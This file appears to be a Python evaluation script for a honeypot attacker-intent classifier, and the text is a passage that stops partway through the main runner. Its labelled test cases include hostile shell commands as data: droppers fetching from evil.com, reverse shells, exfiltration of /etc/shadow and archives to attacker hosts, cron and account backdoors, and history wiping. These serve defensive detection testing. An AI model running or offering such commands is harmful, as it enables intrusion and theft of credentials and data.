#!/usr/bin/env python3
"""
==============================================================================
Phase 9 — Experimental Evaluation Script
Intent-Aware Deception System for Real-Time Attacker Profiling
Version: v1.0 Release Candidate
==============================================================================

IMPORTANT:
- This script DOES NOT modify any production code or data.
- Evaluation uses an isolated in-memory pipeline with synthetic NormalizedEvent
  objects mirroring what real Cowrie telemetry produces.
- No external network connections are made except to the Gemini API (optional).
- Results are stored exclusively in docs/evaluation/.
- No predictions are manually altered.
==============================================================================
"""

import csv
import json
import logging
import os
import sys
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

# ── Ensure project root is on PYTHONPATH ─────────────────────────────────────
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

import matplotlib
matplotlib.use("Agg")  # Non-interactive backend for headless rendering
import matplotlib.pyplot as plt
import matplotlib.patches as mpatches
import numpy as np

from backend.app.models.events import NormalizedEvent
from backend.app.models.features import SessionFeatures
from backend.app.models.intent import AttackStage, IntentCategory
from backend.app.services.feature_extractor import FeatureExtractor
from backend.app.services.gemini_classifier import GeminiClassifier
from backend.app.services.hybrid_classifier import HybridClassifier
from backend.app.services.risk_engine import RiskEngine
from backend.app.services.rule_classifier import RuleClassifier

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger("phase9_eval")

# ── Output directory ──────────────────────────────────────────────────────────
EVAL_DIR = PROJECT_ROOT / "docs" / "evaluation"
EVAL_DIR.mkdir(parents=True, exist_ok=True)

# ── Evaluation start timestamp ────────────────────────────────────────────────
EVAL_TIMESTAMP = datetime.now(timezone.utc).isoformat()

# =============================================================================
#  TASK 1: Intent taxonomy — extracted from frozen v1.0 implementation
# =============================================================================
SUPPORTED_INTENTS = [
    IntentCategory.RECONNAISSANCE,
    IntentCategory.DISCOVERY,
    IntentCategory.CREDENTIAL_ACCESS,
    IntentCategory.EXECUTION,
    IntentCategory.PRIVILEGE_ESCALATION,
    IntentCategory.PERSISTENCE,
    IntentCategory.EXPLOITATION,
    IntentCategory.EXFILTRATION,
    IntentCategory.CLEANUP,
    IntentCategory.OTHER,
]

SUPPORTED_STAGES = [
    AttackStage.INITIAL_ACCESS,
    AttackStage.RECONNAISSANCE,
    AttackStage.DISCOVERY,
    AttackStage.EXECUTION,
    AttackStage.CREDENTIAL_ACCESS,
    AttackStage.PRIVILEGE_ESCALATION,
    AttackStage.PERSISTENCE,
    AttackStage.EXFILTRATION,
    AttackStage.CLEANUP,
    AttackStage.UNKNOWN,
]

# =============================================================================
#  TASK 2: Controlled evaluation dataset — 42 labelled test cases
#
#  Design principles:
#  - Every IntentCategory has ≥ 3 cases (where practical with the existing rules)
#  - Cases are drawn from patterns explicitly defined in RULES_CATALOG (rule_classifier.py)
#  - Additional edge-case and boundary cases are included
#  - event_type is set to match what a real Cowrie JSON event would contain
# =============================================================================
EVALUATION_CASES: List[Dict[str, Any]] = [
    # ─── CREDENTIAL_ACCESS (5 cases) ─────────────────────────────────────────
    {
        "test_id": "TC-CRED-01",
        "expected_intent": IntentCategory.CREDENTIAL_ACCESS,
        "expected_attack_stage": AttackStage.CREDENTIAL_ACCESS,
        "scenario": "Failed authentication attempt (brute-force login)",
        "event_type": "login_failed",
        "command": None,
        "username": "admin",
    },
    {
        "test_id": "TC-CRED-02",
        "expected_intent": IntentCategory.CREDENTIAL_ACCESS,
        "expected_attack_stage": AttackStage.CREDENTIAL_ACCESS,
        "scenario": "Reading /etc/shadow for password hashes",
        "event_type": "command_input",
        "command": "cat /etc/shadow",
        "username": "root",
    },
    {
        "test_id": "TC-CRED-03",
        "expected_intent": IntentCategory.CREDENTIAL_ACCESS,
        "expected_attack_stage": AttackStage.CREDENTIAL_ACCESS,
        "scenario": "Dumping SSH private key",
        "event_type": "command_input",
        "command": "cat ~/.ssh/id_rsa",
        "username": "root",
    },
    {
        "test_id": "TC-CRED-04",
        "expected_intent": IntentCategory.CREDENTIAL_ACCESS,
        "expected_attack_stage": AttackStage.CREDENTIAL_ACCESS,
        "scenario": "Searching bash history for passwords",
        "event_type": "command_input",
        "command": "cat .bash_history",
        "username": "root",
    },
    {
        "test_id": "TC-CRED-05",
        "expected_intent": IntentCategory.CREDENTIAL_ACCESS,
        "expected_attack_stage": AttackStage.CREDENTIAL_ACCESS,
        "scenario": "Grep for credentials in configuration files",
        "event_type": "command_input",
        "command": "grep -i password /etc/mysql/my.cnf",
        "username": "root",
    },

    # ─── PRIVILEGE_ESCALATION (4 cases) ──────────────────────────────────────
    {
        "test_id": "TC-PRIV-01",
        "expected_intent": IntentCategory.PRIVILEGE_ESCALATION,
        "expected_attack_stage": AttackStage.PRIVILEGE_ESCALATION,
        "scenario": "sudo -l to enumerate sudo permissions",
        "event_type": "command_input",
        "command": "sudo -l",
        "username": "user",
    },
    {
        "test_id": "TC-PRIV-02",
        "expected_intent": IntentCategory.PRIVILEGE_ESCALATION,
        "expected_attack_stage": AttackStage.PRIVILEGE_ESCALATION,
        "scenario": "su root to switch to root user",
        "event_type": "command_input",
        "command": "su root",
        "username": "user",
    },
    {
        "test_id": "TC-PRIV-03",
        "expected_intent": IntentCategory.PRIVILEGE_ESCALATION,
        "expected_attack_stage": AttackStage.PRIVILEGE_ESCALATION,
        "scenario": "find SUID binaries for privilege escalation vector",
        "event_type": "command_input",
        "command": "find / -perm -4000 -type f 2>/dev/null",
        "username": "user",
    },
    {
        "test_id": "TC-PRIV-04",
        "expected_intent": IntentCategory.PRIVILEGE_ESCALATION,
        "expected_attack_stage": AttackStage.PRIVILEGE_ESCALATION,
        "scenario": "pkexec invocation for local privilege escalation",
        "event_type": "command_input",
        "command": "pkexec /bin/bash",
        "username": "user",
    },

    # ─── EXECUTION (5 cases) ─────────────────────────────────────────────────
    {
        "test_id": "TC-EXEC-01",
        "expected_intent": IntentCategory.EXECUTION,
        "expected_attack_stage": AttackStage.EXECUTION,
        "scenario": "wget payload and pipe to bash (dropper)",
        "event_type": "command_input",
        "command": "wget http://evil.com/payload.sh -O /tmp/p.sh; bash /tmp/p.sh",
        "username": "root",
    },
    {
        "test_id": "TC-EXEC-02",
        "expected_intent": IntentCategory.EXECUTION,
        "expected_attack_stage": AttackStage.EXECUTION,
        "scenario": "curl pipe to bash (one-liner dropper)",
        "event_type": "command_input",
        "command": "curl http://malware.net/install.sh | bash",
        "username": "root",
    },
    {
        "test_id": "TC-EXEC-03",
        "expected_intent": IntentCategory.EXECUTION,
        "expected_attack_stage": AttackStage.EXECUTION,
        "scenario": "bash reverse shell via /dev/tcp",
        "event_type": "command_input",
        "command": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        "username": "root",
    },
    {
        "test_id": "TC-EXEC-04",
        "expected_intent": IntentCategory.EXECUTION,
        "expected_attack_stage": AttackStage.EXECUTION,
        "scenario": "Python inline socket reverse shell",
        "event_type": "command_input",
        "command": "python3 -c 'import socket,os,subprocess; s=socket.socket(); s.connect((\"10.0.0.1\",4444))'",
        "username": "root",
    },
    {
        "test_id": "TC-EXEC-05",
        "expected_intent": IntentCategory.EXECUTION,
        "expected_attack_stage": AttackStage.EXECUTION,
        "scenario": "netcat reverse shell execution",
        "event_type": "command_input",
        "command": "nc 10.0.0.1 4444 -e /bin/bash",
        "username": "root",
    },

    # ─── PERSISTENCE (4 cases) ───────────────────────────────────────────────
    {
        "test_id": "TC-PERS-01",
        "expected_intent": IntentCategory.PERSISTENCE,
        "expected_attack_stage": AttackStage.PERSISTENCE,
        "scenario": "Add attacker SSH public key to authorized_keys",
        "event_type": "command_input",
        "command": "echo 'ssh-rsa AAAAB3NzaC1...' >> ~/.ssh/authorized_keys",
        "username": "root",
    },
    {
        "test_id": "TC-PERS-02",
        "expected_intent": IntentCategory.PERSISTENCE,
        "expected_attack_stage": AttackStage.PERSISTENCE,
        "scenario": "crontab -e to install persistence via cron",
        "event_type": "command_input",
        "command": "crontab -e",
        "username": "root",
    },
    {
        "test_id": "TC-PERS-03",
        "expected_intent": IntentCategory.PERSISTENCE,
        "expected_attack_stage": AttackStage.PERSISTENCE,
        "scenario": "Append malicious cron job to /etc/crontab",
        "event_type": "command_input",
        "command": "echo '*/5 * * * * root /tmp/backdoor.sh' >> /etc/crontab",
        "username": "root",
    },
    {
        "test_id": "TC-PERS-04",
        "expected_intent": IntentCategory.PERSISTENCE,
        "expected_attack_stage": AttackStage.PERSISTENCE,
        "scenario": "Create backdoor sudo account",
        "event_type": "command_input",
        "command": "useradd hacker -G sudo",
        "username": "root",
    },

    # ─── EXFILTRATION (4 cases) ──────────────────────────────────────────────
    {
        "test_id": "TC-EXFIL-01",
        "expected_intent": IntentCategory.EXFILTRATION,
        "expected_attack_stage": AttackStage.EXFILTRATION,
        "scenario": "tar archive /etc and transfer via curl",
        "event_type": "command_input",
        "command": "tar -czf /tmp/loot.tar.gz /etc && curl -X POST -F file=@/tmp/loot.tar.gz http://evil.com/upload",
        "username": "root",
    },
    {
        "test_id": "TC-EXFIL-02",
        "expected_intent": IntentCategory.EXFILTRATION,
        "expected_attack_stage": AttackStage.EXFILTRATION,
        "scenario": "scp /etc/passwd to remote attacker host",
        "event_type": "command_input",
        "command": "scp /etc/passwd attacker@192.168.1.100:~/loot/",
        "username": "root",
    },
    {
        "test_id": "TC-EXFIL-03",
        "expected_intent": IntentCategory.EXFILTRATION,
        "expected_attack_stage": AttackStage.EXFILTRATION,
        "scenario": "nc pipe of /etc/shadow to remote host",
        "event_type": "command_input",
        "command": "nc 10.0.0.1 1234 < /etc/shadow",
        "username": "root",
    },
    {
        "test_id": "TC-EXFIL-04",
        "expected_intent": IntentCategory.EXFILTRATION,
        "expected_attack_stage": AttackStage.EXFILTRATION,
        "scenario": "rsync home directory to remote attacker",
        "event_type": "command_input",
        "command": "rsync -avz /home/ attacker@10.0.0.1:/dump/",
        "username": "root",
    },

    # ─── CLEANUP (4 cases) ───────────────────────────────────────────────────
    {
        "test_id": "TC-CLEAN-01",
        "expected_intent": IntentCategory.CLEANUP,
        "expected_attack_stage": AttackStage.CLEANUP,
        "scenario": "history -c to wipe shell history",
        "event_type": "command_input",
        "command": "history -c",
        "username": "root",
    },
    {
        "test_id": "TC-CLEAN-02",
        "expected_intent": IntentCategory.CLEANUP,
        "expected_attack_stage": AttackStage.CLEANUP,
        "scenario": "rm -rf .bash_history to erase history file",
        "event_type": "command_input",
        "command": "rm -rf ~/.bash_history",
        "username": "root",
    },
    {
        "test_id": "TC-CLEAN-03",
        "expected_intent": IntentCategory.CLEANUP,
        "expected_attack_stage": AttackStage.CLEANUP,
        "scenario": "unset HISTFILE to prevent history logging",
        "event_type": "command_input",
        "command": "unset HISTFILE",
        "username": "root",
    },
    {
        "test_id": "TC-CLEAN-04",
        "expected_intent": IntentCategory.CLEANUP,
        "expected_attack_stage": AttackStage.CLEANUP,
        "scenario": "export HISTSIZE=0 to suppress history",
        "event_type": "command_input",
        "command": "export HISTSIZE=0",
        "username": "root",
    },

    # ─── EXPLOITATION (3 cases) ──────────────────────────────────────────────
    {
        "test_id": "TC-EXPLOIT-01",
        "expected_intent": IntentCategory.EXPLOITATION,
        "expected_attack_stage": AttackStage.EXECUTION,
        "scenario": "Shellshock exploit pattern via bash function injection",
        "event_type": "command_input",
        "command": "() { :; }; /bin/bash -i",
        "username": "root",
    },
    {
        "test_id": "TC-EXPLOIT-02",
        "expected_intent": IntentCategory.EXPLOITATION,
        "expected_attack_stage": AttackStage.EXECUTION,
        "scenario": "CVE reference in command (exploit probe)",
        "event_type": "command_input",
        "command": "python3 exploit_CVE-2021-4034.py",
        "username": "root",
    },
    {
        "test_id": "TC-EXPLOIT-03",
        "expected_intent": IntentCategory.EXPLOITATION,
        "expected_attack_stage": AttackStage.EXECUTION,
        "scenario": "dirtycow reference in malicious execution",
        "event_type": "command_input",
        "command": "./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'",
        "username": "root",
    },

    # ─── RECONNAISSANCE (4 cases) ────────────────────────────────────────────
    {
        "test_id": "TC-RECON-01",
        "expected_intent": IntentCategory.RECONNAISSANCE,
        "expected_attack_stage": AttackStage.RECONNAISSANCE,
        "scenario": "whoami — identify current user",
        "event_type": "command_input",
        "command": "whoami",
        "username": "root",
    },
    {
        "test_id": "TC-RECON-02",
        "expected_intent": IntentCategory.RECONNAISSANCE,
        "expected_attack_stage": AttackStage.RECONNAISSANCE,
        "scenario": "uname -a — full OS and kernel information",
        "event_type": "command_input",
        "command": "uname -a",
        "username": "root",
    },
    {
        "test_id": "TC-RECON-03",
        "expected_intent": IntentCategory.RECONNAISSANCE,
        "expected_attack_stage": AttackStage.RECONNAISSANCE,
        "scenario": "hostname — identify system hostname",
        "event_type": "command_input",
        "command": "hostname",
        "username": "root",
    },
    {
        "test_id": "TC-RECON-04",
        "expected_intent": IntentCategory.RECONNAISSANCE,
        "expected_attack_stage": AttackStage.RECONNAISSANCE,
        "scenario": "cat /etc/os-release — OS version fingerprinting",
        "event_type": "command_input",
        "command": "cat /etc/os-release",
        "username": "root",
    },

    # ─── DISCOVERY (5 cases) ─────────────────────────────────────────────────
    {
        "test_id": "TC-DISC-01",
        "expected_intent": IntentCategory.DISCOVERY,
        "expected_attack_stage": AttackStage.DISCOVERY,
        "scenario": "ls -la / — filesystem root directory listing",
        "event_type": "command_input",
        "command": "ls -la /",
        "username": "root",
    },
    {
        "test_id": "TC-DISC-02",
        "expected_intent": IntentCategory.DISCOVERY,
        "expected_attack_stage": AttackStage.DISCOVERY,
        "scenario": "ps aux — enumerate running processes",
        "event_type": "command_input",
        "command": "ps aux",
        "username": "root",
    },
    {
        "test_id": "TC-DISC-03",
        "expected_intent": IntentCategory.DISCOVERY,
        "expected_attack_stage": AttackStage.DISCOVERY,
        "scenario": "netstat -tunlp — open port and network socket discovery",
        "event_type": "command_input",
        "command": "netstat -tunlp",
        "username": "root",
    },
    {
        "test_id": "TC-DISC-04",
        "expected_intent": IntentCategory.DISCOVERY,
        "expected_attack_stage": AttackStage.DISCOVERY,
        "scenario": "cat /etc/passwd — user account enumeration",
        "event_type": "command_input",
        "command": "cat /etc/passwd",
        "username": "root",
    },
    {
        "test_id": "TC-DISC-05",
        "expected_intent": IntentCategory.DISCOVERY,
        "expected_attack_stage": AttackStage.DISCOVERY,
        "scenario": "ip a — network interface discovery",
        "event_type": "command_input",
        "command": "ip a",
        "username": "root",
    },

    # ─── OTHER (4 cases — benign / handshake events) ─────────────────────────
    {
        "test_id": "TC-OTHER-01",
        "expected_intent": IntentCategory.OTHER,
        "expected_attack_stage": AttackStage.INITIAL_ACCESS,
        "scenario": "Successful SSH authentication (initial access handshake)",
        "event_type": "login_success",
        "command": None,
        "username": "root",
    },
    {
        "test_id": "TC-OTHER-02",
        "expected_intent": IntentCategory.OTHER,
        "expected_attack_stage": AttackStage.INITIAL_ACCESS,
        "scenario": "Session connect event (TCP/SSH connection establishment)",
        "event_type": "session_connect",
        "command": None,
        "username": None,
    },
    {
        "test_id": "TC-OTHER-03",
        "expected_intent": IntentCategory.OTHER,
        "expected_attack_stage": AttackStage.UNKNOWN,
        "scenario": "benign shell navigation (pwd)",
        "event_type": "command_input",
        "command": "pwd",
        "username": "root",
    },
    {
        "test_id": "TC-OTHER-04",
        "expected_intent": IntentCategory.OTHER,
        "expected_attack_stage": AttackStage.UNKNOWN,
        "scenario": "benign clear command",
        "event_type": "command_input",
        "command": "clear",
        "username": "root",
    },
]


def make_normalized_event(case: Dict[str, Any]) -> NormalizedEvent:
    """Construct a NormalizedEvent matching what the Cowrie pipeline produces."""
    return NormalizedEvent(
        event_id=uuid.uuid4().hex[:24],
        timestamp=datetime.now(timezone.utc),
        session_id=f"eval_{case['test_id'].replace('-', '_').lower()}",
        source_ip="127.0.0.1",
        source_port=54321,
        protocol="ssh",
        username=case.get("username"),
        event_type=case["event_type"],
        command=case.get("command"),
        raw_event={
            "eventid": f"cowrie.{case['event_type'].replace('_', '.')}",
            "input": case.get("command") or "",
            "username": case.get("username") or "",
        },
    )


def make_session_features(case: Dict[str, Any]) -> SessionFeatures:
    """Build minimal plausible session features for each test case."""
    has_cmd = bool(case.get("command"))
    return SessionFeatures(
        session_id=f"eval_{case['test_id'].replace('-', '_').lower()}",
        source_ip="127.0.0.1",
        protocol="ssh",
        username=case.get("username"),
        total_events=3 if has_cmd else 1,
        command_count=1 if has_cmd else 0,
        unique_commands=[case["command"]] if has_cmd else [],
        unique_command_count=1 if has_cmd else 0,
        login_attempt_count=1,
        login_success_count=1 if case["event_type"] == "login_success" else 0,
        login_failed_count=1 if case["event_type"] == "login_failed" else 0,
        distinct_event_types_count=2,
        activity_rate=0.5,
        command_frequency=0.5 if has_cmd else 0.0,
    )


def accuracy_precision_recall_f1(
    y_true: List[str], y_pred: List[str]
) -> Dict[str, Any]:
    """Compute per-class and aggregate classification metrics from scratch."""
    classes = sorted(set(y_true + y_pred))
    class_metrics: Dict[str, Dict] = {}

    for cls in classes:
        tp = sum(1 for t, p in zip(y_true, y_pred) if t == cls and p == cls)
        fp = sum(1 for t, p in zip(y_true, y_pred) if t != cls and p == cls)
        fn = sum(1 for t, p in zip(y_true, y_pred) if t == cls and p != cls)
        support = sum(1 for t in y_true if t == cls)
        precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
        recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
        f1 = (2 * precision * recall / (precision + recall)) if (precision + recall) > 0 else 0.0
        class_metrics[cls] = {
            "tp": tp, "fp": fp, "fn": fn,
            "support": support,
            "precision": round(precision, 4),
            "recall": round(recall, 4),
            "f1": round(f1, 4),
        }

    n = len(y_true)
    accuracy = sum(1 for t, p in zip(y_true, y_pred) if t == p) / n if n > 0 else 0.0

    # Macro averages (unweighted across classes present in ground truth)
    gt_classes = [c for c in classes if any(t == c for t in y_true)]
    macro_p = sum(class_metrics[c]["precision"] for c in gt_classes) / len(gt_classes) if gt_classes else 0.0
    macro_r = sum(class_metrics[c]["recall"] for c in gt_classes) / len(gt_classes) if gt_classes else 0.0
    macro_f1 = sum(class_metrics[c]["f1"] for c in gt_classes) / len(gt_classes) if gt_classes else 0.0

    # Weighted averages
    total_support = sum(class_metrics[c]["support"] for c in gt_classes)
    weighted_p = sum(class_metrics[c]["precision"] * class_metrics[c]["support"] for c in gt_classes) / total_support if total_support > 0 else 0.0
    weighted_r = sum(class_metrics[c]["recall"] * class_metrics[c]["support"] for c in gt_classes) / total_support if total_support > 0 else 0.0
    weighted_f1 = sum(class_metrics[c]["f1"] * class_metrics[c]["support"] for c in gt_classes) / total_support if total_support > 0 else 0.0

    return {
        "accuracy": round(accuracy, 4),
        "macro_precision": round(macro_p, 4),
        "macro_recall": round(macro_r, 4),
        "macro_f1": round(macro_f1, 4),
        "weighted_precision": round(weighted_p, 4),
        "weighted_recall": round(weighted_r, 4),
        "weighted_f1": round(weighted_f1, 4),
        "per_class": class_metrics,
        "classes": classes,
    }


def build_confusion_matrix(
    y_true: List[str], y_pred: List[str], labels: List[str]
) -> np.ndarray:
    label_idx = {l: i for i, l in enumerate(labels)}
    n = len(labels)
    matrix = np.zeros((n, n), dtype=int)
    for t, p in zip(y_true, y_pred):
        if t in label_idx and p in label_idx:
            matrix[label_idx[t]][label_idx[p]] += 1
    return matrix


def plot_confusion_matrix(matrix: np.ndarray, labels: List[str], output_path: Path):
    """Render and save confusion matrix as PNG."""
    fig, ax = plt.subplots(figsize=(12, 10))
    fig.patch.set_facecolor("#1a1a2e")
    ax.set_facecolor("#1a1a2e")

    im = ax.imshow(matrix, interpolation="nearest", cmap="Blues")
    plt.colorbar(im, ax=ax, fraction=0.046, pad=0.04)

    tick_marks = np.arange(len(labels))
    short_labels = [l.replace("_", "\n") for l in labels]
    ax.set_xticks(tick_marks)
    ax.set_xticklabels(short_labels, fontsize=7, color="white", rotation=45, ha="right")
    ax.set_yticks(tick_marks)
    ax.set_yticklabels(short_labels, fontsize=7, color="white")

    # Annotate cells
    thresh = matrix.max() / 2.0
    for i in range(len(labels)):
        for j in range(len(labels)):
            val = matrix[i, j]
            ax.text(j, i, str(val), ha="center", va="center",
                    color="white" if val < thresh else "#1a1a2e", fontsize=9, fontweight="bold")

    ax.set_ylabel("True Intent", color="white", fontsize=11)
    ax.set_xlabel("Predicted Intent", color="white", fontsize=11)
    ax.set_title("Confusion Matrix — Hybrid Intent Classifier (Phase 9 Evaluation)", color="white", fontsize=12, pad=15)
    ax.tick_params(colors="white")
    for spine in ax.spines.values():
        spine.set_edgecolor("#4a4a6a")

    plt.tight_layout()
    plt.savefig(str(output_path), dpi=150, bbox_inches="tight", facecolor=fig.get_facecolor())
    plt.close(fig)
    print(f"  [+] Saved: {output_path.name}")


def plot_intent_distribution(y_true: List[str], y_pred: List[str], output_path: Path):
    """Bar chart comparing true vs predicted intent distributions."""
    all_intents = sorted(set(y_true + y_pred))
    true_counts = [y_true.count(i) for i in all_intents]
    pred_counts = [y_pred.count(i) for i in all_intents]

    x = np.arange(len(all_intents))
    width = 0.35

    fig, ax = plt.subplots(figsize=(14, 6))
    fig.patch.set_facecolor("#1a1a2e")
    ax.set_facecolor("#1a1a2e")

    bars1 = ax.bar(x - width / 2, true_counts, width, label="Ground Truth", color="#4ecdc4", alpha=0.85)
    bars2 = ax.bar(x + width / 2, pred_counts, width, label="Predicted", color="#ff6b6b", alpha=0.85)

    ax.set_xlabel("Intent Category", color="white", fontsize=10)
    ax.set_ylabel("Count", color="white", fontsize=10)
    ax.set_title("Intent Distribution — Ground Truth vs Predicted", color="white", fontsize=12)
    ax.set_xticks(x)
    ax.set_xticklabels([i.replace("_", "\n") for i in all_intents], color="white", fontsize=7)
    ax.set_yticklabels(ax.get_yticks(), color="white")
    ax.tick_params(colors="white")
    ax.legend(facecolor="#2d2d4e", edgecolor="#4a4a6a", labelcolor="white")
    ax.spines["bottom"].set_color("#4a4a6a")
    ax.spines["left"].set_color("#4a4a6a")
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)

    plt.tight_layout()
    plt.savefig(str(output_path), dpi=150, bbox_inches="tight", facecolor=fig.get_facecolor())
    plt.close(fig)
    print(f"  [+] Saved: {output_path.name}")


def plot_risk_distribution(results: List[Dict], output_path: Path):
    """Histogram of risk scores with severity tier overlays."""
    scores = [r["risk_score"] for r in results]

    fig, ax = plt.subplots(figsize=(11, 5))
    fig.patch.set_facecolor("#1a1a2e")
    ax.set_facecolor("#1a1a2e")

    # Severity tier backgrounds
    ax.axvspan(0, 25, alpha=0.15, color="#4ecdc4", label="LOW (0-24)")
    ax.axvspan(25, 50, alpha=0.15, color="#f7dc6f", label="MEDIUM (25-49)")
    ax.axvspan(50, 75, alpha=0.15, color="#e67e22", label="HIGH (50-74)")
    ax.axvspan(75, 100, alpha=0.15, color="#e74c3c", label="CRITICAL (75-100)")

    ax.hist(scores, bins=20, range=(0, 100), color="#a29bfe", edgecolor="#6c5ce7", linewidth=0.8, alpha=0.9)

    ax.set_xlabel("Risk Score (0-100)", color="white", fontsize=10)
    ax.set_ylabel("Frequency", color="white", fontsize=10)
    ax.set_title("Risk Score Distribution — Phase 9 Evaluation Cases", color="white", fontsize=12)
    ax.tick_params(colors="white")
    ax.set_xlim(0, 100)
    ax.legend(facecolor="#2d2d4e", edgecolor="#4a4a6a", labelcolor="white", fontsize=8)
    ax.spines["bottom"].set_color("#4a4a6a")
    ax.spines["left"].set_color("#4a4a6a")
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)

    plt.tight_layout()
    plt.savefig(str(output_path), dpi=150, bbox_inches="tight", facecolor=fig.get_facecolor())
    plt.close(fig)
    print(f"  [+] Saved: {output_path.name}")


def measure_latencies(
    rule_clf: RuleClassifier,
    hybrid_clf: HybridClassifier,
    risk_engine: RiskEngine,
    n_reps: int = 50,
) -> Dict[str, Any]:
    """Measure average rule classification and full hybrid pipeline latencies."""
    # Use a representative DISCOVERY command for repeatable latency tests
    test_event = NormalizedEvent(
        event_id="latency_test_event",
        timestamp=datetime.now(timezone.utc),
        session_id="latency_test",
        source_ip="127.0.0.1",
        source_port=12345,
        protocol="ssh",
        username="root",
        event_type="command_input",
        command="ls -la /var/log",
        raw_event={"eventid": "cowrie.command.input", "input": "ls -la /var/log"},
    )
    test_features = make_session_features({
        "test_id": "latency",
        "event_type": "command_input",
        "command": "ls -la /var/log",
        "username": "root",
    })

    # Measure rule classification latency
    rule_times = []
    for _ in range(n_reps):
        t0 = time.perf_counter()
        rule_clf.classify(test_event, test_features)
        rule_times.append((time.perf_counter() - t0) * 1000)  # ms

    rule_avg = round(sum(rule_times) / len(rule_times), 4)
    rule_min = round(min(rule_times), 4)
    rule_max = round(max(rule_times), 4)

    # Measure full hybrid pipeline latency (rule + risk only; Gemini measured separately if enabled)
    # We use the same classifier instance; Gemini may or may not fire
    hybrid_times = []
    for _ in range(n_reps):
        t0 = time.perf_counter()
        clf_result = hybrid_clf.classify(test_event, test_features)
        risk_engine.evaluate(test_event, clf_result, test_features)
        hybrid_times.append((time.perf_counter() - t0) * 1000)

    hybrid_avg = round(sum(hybrid_times) / len(hybrid_times), 4)
    hybrid_min = round(min(hybrid_times), 4)
    hybrid_max = round(max(hybrid_times), 4)

    return {
        "repetitions": n_reps,
        "rule_classification_avg_ms": rule_avg,
        "rule_classification_min_ms": rule_min,
        "rule_classification_max_ms": rule_max,
        "hybrid_pipeline_avg_ms": hybrid_avg,
        "hybrid_pipeline_min_ms": hybrid_min,
        "hybrid_pipeline_max_ms": hybrid_max,
        "gemini_latency_note": "Gemini API latency measured separately during live evaluations; "
                               "see gemini_latency_avg_ms in evaluation_results.csv",
    }


# =============================================================================
#  MAIN EVALUATION RUNNER
# =============================================================================
def run_evaluation():
    print("\n" + "=" * 70)
    print("  PHASE 9 — EXPERIMENTAL EVALUATION")
    print("  Intent-Aware Deception System v1.0")
    print(f"  Started: {EVAL_TIMESTAMP}")
    print("=" * 70)

    # ── Instantiate classifiers (frozen v1.0 — NO modification) ─────────────
    rule_clf = RuleClassifier()
    gemini_clf = GeminiClassifier()
    hybrid_clf = HybridClassifier(rule_classifier=rule_clf, gemini_classifier=gemini_clf)
    risk_engine = RiskEngine()

    print(f"\n[TASK 1] Intent Taxonomy ({len(SUPPORTED_INTENTS)} categories):")
    for intent in SUPPORTED_INTENTS:
        print(f"  - {intent.value}")

    print(f"\n[TASK 2] Evaluation dataset: {len(EVALUATION_CASES)} labelled test cases")

    # -- Run classifier on every test case ------------------------------------
    print("\n[TASK 3] Running classifier over all evaluation cases...")
    results: List[Dict[str, Any]] = []
    y_true_intent: List[str] = []
    y_pred_intent: List[str] = []
    y_true_stage: List[str] = []
    y_pred_stage: List[str] = []

    for case in EVALUATION_CASES:
        event = make_normalized_event(case)
        features = make_session_features(case)

        # Rule-only classification
        t_rule_start = time.perf_counter()
        rule_result = rule_clf.classify(event, features)
        rule_latency_ms = round((time.perf_counter() - t_rule_start) * 1000, 4)

        # Hybrid classification (rule + Gemini if applicable)
        t_hybrid_start = time.perf_counter()
        hybrid_result = hybrid_clf.classify(event, features)
        hybrid_latency_ms = round((time.perf_counter() - t_hybrid_start) * 1000, 4)

        # Gemini was only invoked if source is GEMINI or HYBRID
        gemini_was_used = hybrid_result.source in ("GEMINI", "HYBRID")
        gemini_latency_ms = hybrid_latency_ms - rule_latency_ms if gemini_was_used else None

        # Risk evaluation
        risk = risk_engine.evaluate(event, hybrid_result, features)

        # Collect predictions
        pred_intent = str(hybrid_result.intent)
        pred_stage = str(hybrid_result.attack_stage)
        exp_intent = case["expected_intent"].value
        exp_stage = case["expected_attack_stage"].value

        y_true_intent.append(exp_intent)
        y_pred_intent.append(pred_intent)
        y_true_stage.append(exp_stage)
        y_pred_stage.append(pred_stage)

        row = {
            "test_id": case["test_id"],
            "scenario": case["scenario"],
            "event_type": case["event_type"],
            "command": case.get("command") or "",
            # Ground truth
            "expected_intent": exp_intent,
            "expected_attack_stage": exp_stage,
            # Rule-only
            "rule_intent": rule_result.intent,
            "rule_stage": rule_result.attack_stage,
            "rule_confidence": rule_result.confidence,
            # Hybrid final
            "predicted_intent": pred_intent,
            "predicted_attack_stage": pred_stage,
            "hybrid_confidence": hybrid_result.confidence,
            "classification_source": hybrid_result.source,
            "gemini_was_used": gemini_was_used,
            "gemini_latency_ms": gemini_latency_ms if gemini_latency_ms is not None else "",
            # Risk
            "risk_score": risk.risk_score,
            "severity": str(risk.severity),
            # Correct?
            "intent_correct": pred_intent == exp_intent,
            "stage_correct": pred_stage == exp_stage,
            # Latencies
            "rule_latency_ms": rule_latency_ms,
            "hybrid_latency_ms": hybrid_latency_ms,
        }
        results.append(row)
        status = "PASS" if row["intent_correct"] else "FAIL"
        print(f"  [{status}] {case['test_id']:14s} | Expected: {exp_intent:22s} | Got: {pred_intent:22s} | Risk: {risk.risk_score:3d} | Src: {hybrid_result.source}")

    # -- TASK 4: Classification metrics ---------------------------------------
    print("\n[TASK 4] Computing classification metrics...")
    intent_metrics = accuracy_precision_recall_f1(y_true_intent, y_pred_intent)

    # -- TASK 5: Attack stage metrics -----------------------------------------
    print("[TASK 5] Computing attack-stage metrics...")
    stage_metrics = accuracy_precision_recall_f1(y_true_stage, y_pred_stage)

    # -- TASK 6: Risk distribution analysis -----------------------------------
    print("[TASK 6] Analyzing risk distribution...")
    risk_scores = [r["risk_score"] for r in results]
    severity_counts: Dict[str, int] = {}
    for r in results:
        sev = str(r["severity"])
        severity_counts[sev] = severity_counts.get(sev, 0) + 1

    risk_by_intent: Dict[str, List[int]] = {}
    for r in results:
        intent = r["expected_intent"]
        risk_by_intent.setdefault(intent, []).append(r["risk_score"])

    risk_stats = {
        "total_cases": len(results),
        "min_risk": min(risk_scores),
        "max_risk": max(risk_scores),
